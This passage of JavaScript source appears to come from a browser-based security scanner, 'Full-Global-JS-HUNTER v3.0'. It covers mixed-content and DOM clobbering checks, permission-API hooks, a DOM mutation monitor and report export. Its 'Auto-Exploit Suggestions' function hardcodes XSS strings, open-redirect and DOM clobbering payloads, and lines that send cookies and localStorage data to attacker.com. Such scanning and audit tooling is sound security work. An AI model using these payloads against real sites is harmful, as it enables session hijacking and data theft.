            const content = script.content;
            const source = script.source;

            // Find dynamic imports and script creations
            const dynamicPatterns = [
                /(?:document\.createElement\s*\(\s*['"]script['"]\s*\)[\s\S]*?(?:src|text)\s*=\s*)(['"`])([^'"`]+)\1/gi,
                /(?:\.src\s*=\s*)(['"`])(https?:\/\/[^'"`]+)\1/gi,
                /(?:importScripts\s*\(\s*)(['"`])(https?:\/\/[^'"`]+)\1/gi,
                /(?:new\s+Worker\s*\(\s*)(['"`])(https?:\/\/[^'"`]+)\1/gi
            ];

            dynamicPatterns.forEach(pattern => {
                let match;
                while ((match = pattern.exec(content)) !== null) {
                    try {
                        const url = match[2];
                        const urlObj = new URL(url, window.location.origin);
                        graph.edges.push({
                            from: source,
                            to: urlObj.href,
                            type: 'dynamic-load'
                        });
                        graph.loadedScripts.push(urlObj.href);
                    } catch (e) { /* not a URL */ }
                }
            });
        });

        graph.rootScripts = graph.nodes.filter(n => n.isSameOrigin).map(n => n.id);

        this.dependencyGraph = graph;
        return graph;
    }

    // ═══════════════════════════════════════════════════════════════════
    // 🆕 BATCH 4: RUNTIME MONITORING (Features 6, 10, 15, 17, 20)
    // ═══════════════════════════════════════════════════════════════════

    // FEATURE 6: Mixed Content Detection
    detectMixedContent() {
        const findings = [];
        if (typeof document === 'undefined') return findings;
        if (window.location.protocol !== 'https:') return findings;

        // Check all loaded resources via Performance API
        try {
            const resources = performance.getEntriesByType('resource');
            resources.forEach(res => {
                if (res.name.startsWith('http:')) {
                    let resourceType = 'unknown';
                    if (res.initiatorType === 'script') resourceType = 'script';
                    else if (res.initiatorType === 'link') resourceType = 'stylesheet';
                    else if (res.initiatorType === 'img') resourceType = 'image';
                    else if (res.initiatorType === 'iframe') resourceType = 'iframe';
                    else if (res.initiatorType === 'xmlhttprequest') resourceType = 'xhr';
                    else if (res.initiatorType === 'fetch') resourceType = 'fetch';
                    else if (res.initiatorType === 'css') resourceType = 'css-font';
                    else resourceType = res.initiatorType;

                    const isActive = ['script', 'iframe', 'xhr', 'fetch'].includes(resourceType);
                    findings.push({
                        feature: 'Mixed Content',
                        url: res.name.substring(0, 150),
                        resourceType: resourceType,
                        severity: isActive ? 'HIGH' : 'MEDIUM',
                        active: isActive,
                        description: isActive ?
                            `Active mixed content: ${resourceType} loaded over HTTP on HTTPS page` :
                            `Passive mixed content: ${resourceType} loaded over HTTP`
                    });
                }
            });
        } catch (e) { /* Performance API not available */ }

        // Also check DOM elements directly
        const httpSources = [
            { selector: 'script[src^="http:"]', type: 'script' },
            { selector: 'link[href^="http:"]', type: 'stylesheet' },
            { selector: 'img[src^="http:"]', type: 'image' },
            { selector: 'iframe[src^="http:"]', type: 'iframe' },
            { selector: 'video[src^="http:"]', type: 'video' },
            { selector: 'audio[src^="http:"]', type: 'audio' },
            { selector: 'embed[src^="http:"]', type: 'embed' },
            { selector: 'object[data^="http:"]', type: 'object' }
        ];

        httpSources.forEach(({ selector, type }) => {
            try {
                document.querySelectorAll(selector).forEach(el => {
                    const src = el.getAttribute('src') || el.getAttribute('href') || el.getAttribute('data') || '';
                    const isActive = ['script', 'iframe'].includes(type);
                    findings.push({
                        feature: 'Mixed Content',
                        element: el.tagName.toLowerCase(),
                        url: src.substring(0, 150),
                        resourceType: type,
                        severity: isActive ? 'HIGH' : 'MEDIUM',
                        active: isActive,
                        description: `DOM ${type} loaded over HTTP: ${src.substring(0, 100)}`
                    });
                });
            } catch (e) { /* selector error */ }
        });

        // Check for CSS @import and url() with http:
        try {
            Array.from(document.styleSheets).forEach(sheet => {
                try {
                    const rules = sheet.cssRules || sheet.rules;
                    if (!rules) return;
                    Array.from(rules).forEach(rule => {
                        if (rule.cssText && rule.cssText.includes('http:')) {
                            findings.push({
                                feature: 'Mixed Content',
                                resourceType: 'css',
                                severity: 'MEDIUM',
                                description: `CSS rule references HTTP resource: ${rule.cssText.substring(0, 100)}`
                            });
                        }
                    });
                } catch (e) { /* cross-origin stylesheet */ }
            });
        } catch (e) { /* stylesheets not accessible */ }

        this.mixedContentResults = findings;
        return findings;
    }

    // FEATURE 10: DOM Clobbering Detection
    detectDOMClobbering() {
        const findings = [];
        if (typeof document === 'undefined') return findings;

        const sensitiveNames = [
            'cookie', 'domain', 'location', 'hostname', 'href', 'protocol',
            'port', 'pathname', 'search', 'hash', 'origin', 'forms',
            'body', 'head', 'documentElement', 'scripts', 'links',
            'forms', 'images', 'all', 'forms', 'cookie', 'domain',
            'parentWindow', 'contentWindow', 'contentDocument'
        ];

        const dangerousGlobals = [
            'document', 'window', 'location', 'navigator', 'history',
            'localStorage', 'sessionStorage', 'console', 'fetch',
            'XMLHttpRequest', 'FormData', 'URL', 'Blob', 'File',
            'Worker', 'WebSocket', 'EventSource'
        ];

        // Check for elements with id/name that shadow DOM APIs
        const elementsWithId = document.querySelectorAll('[id]');
        elementsWithId.forEach(el => {
            const id = el.id;
            if (!id) return;

            // Check if this id shadows a window property
            if (dangerousGlobals.includes(id) || sensitiveNames.includes(id)) {
                findings.push({
                    feature: 'DOM Clobbering',
                    element: el.tagName.toLowerCase(),
                    id: id,
                    severity: 'HIGH',
                    description: `Element id="${id}" shadows ${id === 'document' ? 'document object' : id === 'location' ? 'location object' : 'global variable'} - potential DOM clobbering`
                });
            }

            // Check for nested form clobbering: document.forms[x]
            if (/^\d+$/.test(id)) {
                findings.push({
                    feature: 'DOM Clobbering',
                    element: el.tagName.toLowerCase(),
                    id: id,
                    severity: 'MEDIUM',
                    description: `Numeric id="${id}" can access elements via document.forms[${id}]`
                });
            }
        });

        // Check for elements with name attribute
        const elementsWithName = document.querySelectorAll('[name]');
        elementsWithName.forEach(el => {
            const name = el.getAttribute('name');
            if (!name) return;

            if (dangerousGlobals.includes(name) || sensitiveNames.includes(name)) {
                findings.push({
                    feature: 'DOM Clobbering',
                    element: el.tagName.toLowerCase(),
                    name: name,
                    severity: 'HIGH',
                    description: `Element name="${name}" can shadow window.${name} via document.${name}`
                });
            }
        });

        // Check for named window properties that could be overwritten
        try {
            const windowKeys = Object.getOwnPropertyNames(window);
            const htmlCollection = document.querySelectorAll('a[name], area[name]');
            htmlCollection.forEach(el => {
                const name = el.getAttribute('name');
                if (name && windowKeys.includes(name)) {
                    findings.push({
                        feature: 'DOM Clobbering',
                        element: el.tagName.toLowerCase(),
                        name: name,
                        severity: 'HIGH',
                        description: `Named ${el.tagName}="${name}" overwrites window.${name} property`
                    });
                }
            });
        } catch (e) { /* window properties not accessible */ }

        this.domClobberingResults = findings;
        return findings;
    }

    // FEATURE 15: Permission Request Monitor
    monitorPermissions() {
        const findings = [];
        this._permissionRequests = [];

        // Hook navigator.permissions.query
        if (navigator.permissions && navigator.permissions.query) {
            const origQuery = navigator.permissions.query.bind(navigator.permissions);
            navigator.permissions.query = function(descriptor) {
                const result = origQuery(descriptor);
                const permName = descriptor?.name || 'unknown';

                findings.push({
                    feature: 'Permission Monitor',
                    permission: permName,
                    severity: permName === 'camera' || permName === 'microphone' ? 'HIGH' : 'MEDIUM',
                    timestamp: Date.now(),
                    description: `Permission query: ${permName}`
                });

                self._permissionRequests.push({ permission: permName, timestamp: Date.now() });
                return result;
            };
        }

        const self = this;

        // Hook Notification.requestPermission
        if (typeof Notification !== 'undefined' && Notification.requestPermission) {
            const origNotifPerm = Notification.requestPermission;
            Notification.requestPermission = function(callback) {
                findings.push({
                    feature: 'Permission Monitor',
                    permission: 'notifications',
                    severity: 'MEDIUM',
                    timestamp: Date.now(),
                    description: 'Notification permission requested'
                });
                self._permissionRequests.push({ permission: 'notifications', timestamp: Date.now() });
                return origNotifPerm.call(Notification, callback);
            };
        }

        // Hook Geolocation
        if (navigator.geolocation) {
            const origGetCurrentPosition = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
            navigator.geolocation.getCurrentPosition = function(success, error, options) {
                findings.push({
                    feature: 'Permission Monitor',
                    permission: 'geolocation',
                    severity: 'HIGH',
                    timestamp: Date.now(),
                    description: 'Geolocation access requested'
                });
                self._permissionRequests.push({ permission: 'geolocation', timestamp: Date.now() });
                return origGetCurrentPosition(success, error, options);
            };

            if (navigator.geolocation.watchPosition) {
                const origWatchPosition = navigator.geolocation.watchPosition.bind(navigator.geolocation);
                navigator.geolocation.watchPosition = function(success, error, options) {
                    findings.push({
                        feature: 'Permission Monitor',
                        permission: 'geolocation-watch',
                        severity: 'HIGH',
                        timestamp: Date.now(),
                        description: 'Geolocation watch requested'
                    });
                    self._permissionRequests.push({ permission: 'geolocation-watch', timestamp: Date.now() });
                    return origWatchPosition(success, error, options);
                };
            }
        }

        // Hook clipboard API
        if (navigator.clipboard) {
            const origWriteText = navigator.clipboard.writeText?.bind(navigator.clipboard);
            if (origWriteText) {
                navigator.clipboard.writeText = function(text) {
                    findings.push({
                        feature: 'Permission Monitor',
                        permission: 'clipboard-write',
                        severity: 'MEDIUM',
                        timestamp: Date.now(),
                        description: `Clipboard write attempted (content length: ${text?.length || 0})`
                    });
                    self._permissionRequests.push({ permission: 'clipboard-write', timestamp: Date.now() });
                    return origWriteText(text);
                };
            }

            const origReadText = navigator.clipboard.readText?.bind(navigator.clipboard);
            if (origReadText) {
                navigator.clipboard.readText = function() {
                    findings.push({
                        feature: 'Permission Monitor',
                        permission: 'clipboard-read',
                        severity: 'HIGH',
                        timestamp: Date.now(),
                        description: 'Clipboard read attempted'
                    });
                    self._permissionRequests.push({ permission: 'clipboard-read', timestamp: Date.now() });
                    return origReadText();
                };
            }
        }

        this.permissionResults = findings;
        return findings;
    }

    // FEATURE 17: Scan Comparison (Diff)
    compareScans(previousScanKey) {
        const storageKey = previousScanKey || `jhscan_${window.location.hostname}_${window.location.pathname}`;
        const currentResults = this.results;
        const comparison = { new: [], fixed: [], unchanged: [], timestamp: Date.now() };

        // Load previous scan from sessionStorage
        let previousResults = null;
        try {
            const stored = sessionStorage.getItem(storageKey);
            if (stored) previousResults = JSON.parse(stored);
        } catch (e) { /* parse error */ }

        // Save current scan
        try {
            sessionStorage.setItem(storageKey, JSON.stringify({
                results: currentResults,
                timestamp: Date.now(),
                url: window.location.href
            }));
        } catch (e) { /* storage full */ }

        if (!previousResults || !previousResults.results) {
            comparison.status = 'first_scan';
            this.scanComparison = comparison;
            return comparison;
        }

        const prev = previousResults.results;

        Object.keys(currentResults).forEach(vulnType => {
            const current = currentResults[vulnType] || [];
            const previous = prev[vulnType] || [];

            const prevKeys = new Set(previous.map(v => `${v.source}:${v.line}:${v.code?.substring(0, 50)}`));
            const currKeys = new Set(current.map(v => `${v.source}:${v.line}:${v.code?.substring(0, 50)}`));

            current.forEach(v => {
                const key = `${v.source}:${v.line}:${v.code?.substring(0, 50)}`;
                if (!prevKeys.has(key)) {
                    comparison.new.push({ ...v, vulnType });
                } else {
                    comparison.unchanged.push({ ...v, vulnType });
                }
            });

            previous.forEach(v => {
                const key = `${v.source}:${v.line}:${v.code?.substring(0, 50)}`;
                if (!currKeys.has(key)) {
                    comparison.fixed.push({ ...v, vulnType });
                }
            });
        });

        comparison.previousTimestamp = previousResults.timestamp;
        comparison.previousURL = previousResults.url;
        comparison.status = 'compared';

        this.scanComparison = comparison;
        return comparison;
    }

    // FEATURE 20: Real-Time DOM Mutation Monitor
    startDOMMonitor(callback) {
        if (typeof MutationObserver === 'undefined') return null;

        const findings = [];
        const self = this;

        const observer = new MutationObserver(mutations => {
            mutations.forEach(mutation => {
                mutation.addedNodes.forEach(node => {
                    if (node.nodeType !== Node.ELEMENT_NODE) return;

                    // Check for dynamically added scripts
                    if (node.tagName === 'SCRIPT') {
                        const src = node.getAttribute('src') || '';
                        findings.push({
                            feature: 'DOM Monitor',
                            type: 'script-injected',
                            element: 'script',
                            src: src.substring(0, 150) || '(inline)',
                            severity: 'HIGH',
                            timestamp: Date.now(),
                            description: src ?
                                `Dynamically injected script: ${src.substring(0, 80)}` :
                                'Dynamically injected inline script'
                        });
                    }

                    // Check for injected iframes
                    if (node.tagName === 'IFRAME') {
                        const src = node.getAttribute('src') || '';
                        findings.push({
                            feature: 'DOM Monitor',
                            type: 'iframe-injected',
                            element: 'iframe',
                            src: src.substring(0, 150),
                            severity: 'HIGH',
                            timestamp: Date.now(),
                            description: `Dynamically injected iframe: ${src.substring(0, 80)}`
                        });
                    }

                    // Check for elements with event handlers
                    const eventAttrs = ['onclick', 'onerror', 'onload', 'onmouseover', 'onfocus'];
                    eventAttrs.forEach(attr => {
                        if (node.getAttribute && node.getAttribute(attr)) {
                            findings.push({
                                feature: 'DOM Monitor',
                                type: 'event-handler-added',
                                element: node.tagName?.toLowerCase() || 'unknown',
                                attribute: attr,
                                severity: 'MEDIUM',
                                timestamp: Date.now(),
                                description: `Dynamic event handler ${attr} added to <${node.tagName?.toLowerCase() || '?'}>`
                            });
                        }
                    });

                    // Check for javascript: URIs
                    if (node.getAttribute) {
                        ['href', 'src', 'action', 'formaction'].forEach(attr => {
                            const val = node.getAttribute(attr) || '';
                            if (/^javascript:/i.test(val)) {
                                findings.push({
                                    feature: 'DOM Monitor',
                                    type: 'javascript-uri',
                                    element: node.tagName?.toLowerCase() || 'unknown',
                                    attribute: attr,
                                    value: val.substring(0, 100),
                                    severity: 'CRITICAL',
                                    timestamp: Date.now(),
                                    description: `Dynamic javascript: URI in ${attr} attribute`
                                });
                            }
                        });
                    }
                });

                // Check attribute mutations for dangerous changes
                if (mutation.type === 'attributes') {
                    const el = mutation.target;
                    const attr = mutation.attributeName;
                    if (attr && (attr.startsWith('on') || attr === 'href' || attr === 'src' || attr === 'action')) {
                        const val = el.getAttribute(attr) || '';
                        if (attr.startsWith('on') || /^javascript:/i.test(val)) {
                            findings.push({
                                feature: 'DOM Monitor',
                                type: 'attribute-modified',
                                element: el.tagName?.toLowerCase() || 'unknown',
                                attribute: attr,
                                value: val.substring(0, 100),
                                severity: 'HIGH',
                                timestamp: Date.now(),
                                description: `Dangerous attribute modification: ${attr} on <${el.tagName?.toLowerCase() || '?'}>`
                            });
                        }
                    }
                }
            });

            if (callback && findings.length > 0) {
                callback(findings[findings.length - 1]);
            }
        });

        observer.observe(document.documentElement, {
            childList: true,
            subtree: true,
            attributes: true,
            attributeFilter: ['href', 'src', 'action', 'formaction', 'onclick', 'onerror', 'onload',
                'onmouseover', 'onfocus', 'onsubmit', 'oninput', 'onkeydown', 'onkeyup']
        });

        this._domObserver = observer;
        this._domMonitorResults = findings;
        return { observer, findings };
    }

    stopDOMMonitor() {
        if (this._domObserver) {
            this._domObserver.disconnect();
            this._domObserver = null;
        }
        return this._domMonitorResults || [];
    }

    // ═══════════════════════════════════════════════════════════════════
    // 🆕 BATCH 5: REPORTING & EXPLOITS (Features 16, 18) + FULL AUDIT
    // ═══════════════════════════════════════════════════════════════════

    // FEATURE 16: HTML Report Generator
    generateHTMLReport() {
        const allFindings = this._collectAllNewFindings();
        const stats = this._computeStats(allFindings);
        const timestamp = new Date().toISOString();

        let rows = '';
        const severityOrder = { 'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4 };
        allFindings.sort((a, b) => (severityOrder[a.severity] || 5) - (severityOrder[b.severity] || 5));

        allFindings.forEach((f, i) => {
            const severityClass = f.severity?.toLowerCase() || 'info';
            rows += `<tr class="severity-${severityClass}">
                <td>${i + 1}</td>
                <td><span class="badge badge-${severityClass}">${f.severity}</span></td>
                <td>${this._escapeHTML(f.feature || '')}</td>
                <td>${this._escapeHTML(f.description || '').substring(0, 120)}</td>
                <td>${this._escapeHTML(f.element || f.source || f.hostname || f.storage || '')}</td>
                <td>${this._escapeHTML(f.value || f.url || f.src || f.cookie || f.key || f.permission || '').substring(0, 60)}</td>
            </tr>`;
        });

        return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>JS Security Audit Report - ${window.location.hostname}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}
.header{text-align:center;padding:30px 0;border-bottom:1px solid #30363d;margin-bottom:30px}
.header h1{font-size:24px;color:#f0f6fc;margin-bottom:8px}
.header p{color:#8b949e;font-size:14px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:30px}
.stat-card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;text-align:center}
.stat-card .number{font-size:28px;font-weight:700}
.stat-card .label{font-size:12px;color:#8b949e;margin-top:4px}
.stat-critical .number{color:#f85149}
.stat-high .number{color:#d29922}
.stat-medium .number{color:#58a6ff}
.stat-low .number{color:#8b949e}
.stat-total .number{color:#f0f6fc}
table{width:100%;border-collapse:collapse;background:#161b22;border:1px solid #30363d;border-radius:8px;overflow:hidden}
th{background:#21262d;padding:12px 16px;text-align:left;font-size:12px;color:#8b949e;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid #30363d}
td{padding:10px 16px;border-bottom:1px solid #21262d;font-size:13px;vertical-align:top}
tr:hover{background:#1c2128}
.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600;text-transform:uppercase}
.badge-critical{background:#f8514922;color:#f85149;border:1px solid #f8514944}
.badge-high{background:#d2992222;color:#d29922;border:1px solid #d2992244}
.badge-medium{background:#58a6ff22;color:#58a6ff;border:1px solid #58a6ff44}
.badge-low{background:#8b949e22;color:#8b949e;border:1px solid #8b949e44}
.badge-info{background:#3fb95022;color:#3fb950;border:1px solid #3fb95044}
tr.severity-critical{border-left:3px solid #f85149}
tr.severity-high{border-left:3px solid #d29922}
tr.severity-medium{border-left:3px solid #58a6ff}
.footer{text-align:center;padding:20px 0;color:#484f58;font-size:12px;border-top:1px solid #30363d;margin-top:30px}
</style>
</head>
<body>
<div class="header">
<h1>JavaScript Security Audit Report</h1>
<p>${window.location.href} | ${timestamp} | Full-Global-JS-HUNTER v3.0</p>
</div>
<div class="stats">
<div class="stat-card stat-total"><div class="number">${stats.total}</div><div class="label">Total Findings</div></div>
<div class="stat-card stat-critical"><div class="number">${stats.critical}</div><div class="label">Critical</div></div>
<div class="stat-card stat-high"><div class="number">${stats.high}</div><div class="label">High</div></div>
<div class="stat-card stat-medium"><div class="number">${stats.medium}</div><div class="label">Medium</div></div>
<div class="stat-card stat-low"><div class="number">${stats.low + stats.info}</div><div class="label">Low / Info</div></div>
</div>
<table>
<thead><tr><th>#</th><th>Severity</th><th>Feature</th><th>Description</th><th>Element/Source</th><th>Value/URL</th></tr></thead>
<tbody>${rows || '<tr><td colspan="6" style="text-align:center;color:#3fb950;padding:20px">No findings - page appears clean</td></tr>'}</tbody>
</table>
<div class="footer">Generated by Full-Global-JS-HUNTER | For authorized security testing only</div>
</body></html>`;
    }

    // Download HTML report
    downloadHTMLReport() {
        const html = this.generateHTMLReport();
        const blob = new Blob([html], { type: 'text/html' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `security-report-${window.location.hostname}-${Date.now()}.html`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    // FEATURE 18: Auto-Exploit Suggestions
    generateExploitSuggestions() {
        const suggestions = [];
        const allFindings = this._collectAllNewFindings();

        allFindings.forEach(finding => {
            const exploit = this._getExploitPayload(finding);
            if (exploit) {
                suggestions.push({
                    feature: finding.feature,
                    severity: finding.severity,
                    finding: finding.description,
                    exploit: exploit
                });
            }
        });

        this.exploitSuggestions = suggestions;
        return suggestions;
    }

    _getExploitPayload(finding) {
        const f = finding;

        // DOM XSS exploits
        if (f.feature === 'DOM Security Audit' && f.dynamic) {
            return {
                type: 'XSS',
                payloads: [
                    '<img src=x onerror=alert(1)>',
                    '<svg/onload=alert(document.domain)>',
                    '<details open ontoggle=alert(1)>',
                    '"><script>alert(document.cookie)</script>'
                ],
                technique: 'Inject payload via the identified DOM sink'
            };
        }

        // JavaScript URL exploits
        if (f.feature === 'JavaScript URL') {
            return {
                type: 'Code Execution',
                payloads: [
                    'javascript:alert(document.domain)',
                    'javascript:fetch("//attacker.com/"+document.cookie)',
                    'javascript:void(document.location="//attacker.com/?c="+document.cookie)'
                ],
                technique: 'Craft link with javascript: URI payload'
            };
        }

        // CSP bypass
        if (f.feature === 'CSP Analysis' && f.directive === 'script-src') {
            return {
                type: 'CSP Bypass',
                payloads: [
                    'Use JSONP endpoints on allowed origins',
                    'Angular template injection if unsafe-inline allowed',
                    'Base tag injection if base-uri not restricted',
                    'Open redirect to inject script on allowed origin'
                ],
                technique: 'Leverage CSP weakness to execute arbitrary script'
            };
        }

        // Open redirect
        if (f.feature === 'Open Redirect') {
            return {
                type: 'Open Redirect -> ATO Chain',
                payloads: [
                    `${f.value || '?url='}//attacker.com`,
                    `${f.value || '?url='}//${window.location.host}%0d%0aLocation:%20//attacker.com`,
                    `javascript:alert(1)//${window.location.host}`
                ],
                technique: 'Chain with OAuth flow or phishing for account takeover'
            };
        }

        // Cookie issues
        if (f.feature === 'Cookie Security' && f.severity === 'CRITICAL') {
            return {
                type: 'Credential Theft',
                payloads: [
                    'document.cookie to exfiltrate',
                    'Fetch API to send cookie to attacker',
                    'XSS + document.cookie for full session hijack'
                ],
                technique: 'Sensitive data in cookie can be stolen via XSS or network interception'
            };
        }

        // Storage issues
        if (f.feature === 'Storage Security' && f.severity === 'CRITICAL') {
            return {
                type: 'Credential Theft',
                payloads: [
                    `localStorage.getItem("${f.key || 'key'}")`,
                    `fetch("//attacker.com/steal?data="+localStorage.getItem("${f.key || 'key'}"))`,
                    'XSS payload to read and exfiltrate storage'
                ],
                technique: 'Sensitive data in localStorage accessible to any script on page'
            };
        }

        // iframe sandbox
        if (f.feature === 'iframe Security' && f.severity === 'CRITICAL') {
            return {
                type: 'Sandbox Escape',
                payloads: [
                    'Parent domain access via same-origin + allow-scripts',
                    'Top navigation to parent frame',
                    'Create new iframe to break sandbox'
                ],
                technique: 'allow-scripts + allow-same-origin allows sandbox self-removal'
            };
        }

        // Form hijacking
        if (f.feature === 'Form Security' && f.description?.includes('HTTP')) {
            return {
                type: 'Credential Interception',
                payloads: [
                    'MITM to intercept form POST data',
                    'SSLStrip to downgrade HTTPS -> HTTP',
                    'Network sniffing for plaintext credentials'
                ],
                technique: 'HTTP form submission exposes credentials in transit'
            };
        }

        // WebSocket
        if (f.feature === 'WebSocket Security' && !f.severity?.includes('INFO')) {
            return {
                type: 'WebSocket Hijack',
                payloads: [
                    'ws:// downgrade allows traffic interception',
                    'Cross-origin WebSocket for data exfiltration',
                    'Message injection on unvalidated WS'
                ],
                technique: 'Insecure WebSocket allows MITM or data injection'
            };
        }

        // Mixed content
        if (f.feature === 'Mixed Content' && f.active) {
            return {
                type: 'Active Content Injection',
                payloads: [
                    'Replace HTTP script with malicious version',
                    'Inject iframe via HTTP resource substitution',
                    'MITM to modify HTTP-served JavaScript'
                ],
                technique: 'Active mixed content can be replaced by attacker on network'
            };
        }

        // DOM clobbering
        if (f.feature === 'DOM Clobbering') {
            return {
                type: 'DOM Clobbering',
                payloads: [
                    `<a id="${f.id || f.name || 'location'}" name="${f.id || f.name || 'location'}" href="//attacker.com">click</a>`,
                    `<form id="${f.id || 'document'}"><input name="cookie" value="stolen"></form>`,
                    `<img id="${f.id || 'body'}" name="${f.id || 'body'}" src=x onerror=alert(1)>`
                ],
                technique: 'Use HTML elements to shadow JavaScript global variables'
            };
        }

        // SRI
        if (f.feature === 'SRI Check' && f.severity === 'HIGH') {
            return {
                type: 'Supply Chain Attack',
                payloads: [
                    'Compromise CDN to serve malicious script',
                    'DNS hijack to redirect script origin',
                    'MITM to modify script content in transit'
                ],
                technique: 'No SRI means modified scripts will execute without verification'
            };
        }

        return null;
    }

    // ═══════════════════════════════════════════════════════════════════
    // 🔧 HELPER: Collect all new feature findings into one array
    // ═══════════════════════════════════════════════════════════════════
    _collectAllNewFindings() {
        const all = [];
        const resultKeys = [
            'domAuditResults', 'openRedirectResults', 'formAuditResults',
            'iframeAuditResults', 'jsUrlResults', 'cspResults',
            'cookieAuditResults', 'storageAuditResults', 'wsAnalysisResults',
            'sriResults', 'thirdPartyResults', 'mixedContentResults',
            'domClobberingResults', 'permissionResults', 'domMonitorResults'
        ];

        resultKeys.forEach(key => {
            const data = this[key];
            if (!data) return;
            if (Array.isArray(data)) {
                all.push(...data);
            } else if (typeof data === 'object') {
                // Handle { findings, ... } objects
                if (data.findings) all.push(...data.findings);
            }
        });

        // Also include extractedURLs categorized items
        if (this.extractedURLs) {
            Object.entries(this.extractedURLs).forEach(([category, items]) => {
                if (Array.isArray(items)) {
                    items.forEach(item => {
                        all.push({
                            feature: 'URL Extraction',
                            category: category,
                            url: item.url,
                            source: item.source,
                            severity: ['admin', 'debug', 'staging'].includes(category) ? 'HIGH' : 'MEDIUM',
                            description: `Found ${category} URL: ${item.url.substring(0, 80)}`
                        });
                    });
                }
            });
        }

        // Include exploit suggestions
        if (this.exploitSuggestions) {
            this.exploitSuggestions.forEach(s => {
                all.push({
                    feature: 'Exploit Suggestion',
                    severity: s.severity,
                    description: `[${s.exploit?.type || 'N/A'}] ${s.finding}`,
                    element: '',
                    value: s.exploit?.payloads?.[0]?.substring(0, 80) || ''
                });
            });
        }

        return all;
    }

    _computeStats(findings) {
        const stats = { total: findings.length, critical: 0, high: 0, medium: 0, low: 0, info: 0 };
        findings.forEach(f => {
            const s = (f.severity || 'INFO').toUpperCase();
            if (s === 'CRITICAL') stats.critical++;
            else if (s === 'HIGH') stats.high++;
            else if (s === 'MEDIUM') stats.medium++;
            else if (s === 'LOW') stats.low++;
            else stats.info++;
        });
        return stats;
    }

    _escapeHTML(str) {
        if (!str) return '';
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;').replace(/'/g, '&#039;');
    }

    // ═══════════════════════════════════════════════════════════════════
    // 🚀 RUN ALL 20 FEATURES AT ONCE
    // ═══════════════════════════════════════════════════════════════════
    async runFullAudit() {
        const results = {};

        // Batch 1: DOM scanning
        results.domSecurity = this.auditDOMSecurity();
        results.openRedirects = this.detectOpenRedirects();
        results.formSecurity = this.auditFormSecurity();
        results.iframeSecurity = this.auditIframeSecurity();
        results.javascriptURLs = this.auditJavascriptURLs();

        // Batch 2: Headers & storage
        results.csp = this.analyzeCSP();
        results.cookies = this.auditCookieSecurity();
        results.storage = this.auditStorageSecurity();
        results.websockets = this.analyzeWebSocketSecurity();

        // Batch 3: External resources
        results.sri = this.checkSubresourceIntegrity();
        results.thirdParty = this.scoreThirdPartyScripts();
        results.extractedURLs = this.extractURLsFromScripts();
        results.dependencyGraph = this.buildDependencyGraph();

        // Batch 4: Runtime monitoring
        results.mixedContent = this.detectMixedContent();
        results.domClobbering = this.detectDOMClobbering();
        results.permissions = this.monitorPermissions();
        results.scanComparison = this.compareScans();
        this.startDOMMonitor();

        // Batch 5: Reporting
        results.exploits = this.generateExploitSuggestions();
        results.htmlReport = this.generateHTMLReport();

        // Also run original pattern scan
        await this.collectAllScripts();
        this.scanAllVulnerabilities();

        // Store full results
        this.fullAuditResults = results;
        window.FULL_AUDIT = results;

        // Compute combined stats
        const allFindings = this._collectAllNewFindings();
        const stats = this._computeStats(allFindings);
        results.stats = stats;

        return results;
    }

    // ═══════════════════════════════════════════════════════════════════
    // 📤 EXPORT METHODS (JSON, CSV, Markdown)
    // ═══════════════════════════════════════════════════════════════════

    _collectExportFindings() {
        const all = [];
        const resultKeys = [
            'domAuditResults', 'openRedirectResults', 'formAuditResults',
            'iframeAuditResults', 'jsUrlResults', 'cspResults',
            'cookieAuditResults', 'storageAuditResults', 'wsAnalysisResults',
            'sriResults', 'thirdPartyResults', 'mixedContentResults',
            'domClobberingResults', 'permissionResults', 'domMonitorResults'
        ];
        resultKeys.forEach(key => {
            const data = this[key];
            if (!data) return;
            if (Array.isArray(data)) all.push(...data);
            else if (data?.findings) all.push(...data.findings);
        });
        if (this.extractedURLs) {
            Object.entries(this.extractedURLs).forEach(([cat, items]) => {
                if (Array.isArray(items)) {
                    items.forEach(item => all.push({
                        feature: 'URL Extraction', category: cat, url: item.url,
                        source: item.source, severity: ['admin', 'debug', 'staging'].includes(cat) ? 'HIGH' : 'MEDIUM',
                        description: `${cat}: ${item.url.substring(0, 80)}`
                    }));
                }
            });
        }
        if (this.exploitSuggestions) {
            this.exploitSuggestions.forEach(s => {
                all.push({
                    feature: 'Exploit Suggestion', severity: s.severity,
                    description: `[${s.exploit?.type}] ${s.finding}`,
                    value: s.exploit?.payloads?.[0]?.substring(0, 80) || ''
                });
            });
        }
        // Add pattern scan results
        if (this.results) {
            Object.entries(this.results).forEach(([vulnType, vulns]) => {
                vulns.forEach(v => all.push({ ...v, feature: vulnType }));
            });
        }
        return all;
    }

    _downloadFile(content, filename, mimeType) {
        const blob = new Blob([content], { type: mimeType });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    exportJSON() {
        const findings = this._collectExportFindings();
        const data = {
            tool: 'Full-Global-JS-HUNTER v3.0',
            url: window.location.href,
            timestamp: new Date().toISOString(),
            summary: {
                total: findings.length,
                critical: findings.filter(f => f.severity === 'CRITICAL').length,
                high: findings.filter(f => f.severity === 'HIGH').length,
                medium: findings.filter(f => f.severity === 'MEDIUM').length,
                low: findings.filter(f => f.severity === 'LOW').length,
                info: findings.filter(f => f.severity === 'INFO').length
            },
            findings: findings
        };
        const json = JSON.stringify(data, null, 2);
        const hostname = window.location.hostname.replace(/[^a-z0-9]/gi, '_');
